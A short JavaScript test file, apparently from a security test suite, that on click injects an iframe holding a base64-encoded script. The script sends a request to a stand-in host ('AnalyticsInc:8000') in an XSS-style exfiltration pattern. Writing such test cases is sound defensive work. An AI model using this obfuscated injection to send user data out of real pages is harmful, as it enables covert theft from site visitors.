// exfil_test_xss16.js
function exfiltrate_key_history() {
  var script = document.createElement("iframe");
  script.src = "data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD14c3MxNiIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

